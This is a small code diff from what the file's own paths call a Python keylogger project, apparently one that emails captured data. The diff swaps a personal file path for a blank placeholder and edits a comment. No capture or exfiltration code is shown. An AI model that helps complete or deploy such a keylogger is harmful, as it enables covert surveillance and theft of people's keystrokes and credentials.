@@ -51,7 +51,7 @@ username = getpass.getuser()
 
 toaddr = email_address
 
-file_path = "C:\\Users\\uzouk\\PycharmProjects\\Keylogger\\Project"
+file_path = "" # Add your file path here
 extend = "\\"
 file_merge = file_path + extend
 
@@ -241,4 +241,4 @@ while number_of_iterations < number_of_iterations_end:
         stoppingTime = time.time() + time_iteration
 
 
-# Testing for keylog here.
+# Testing for keylog here
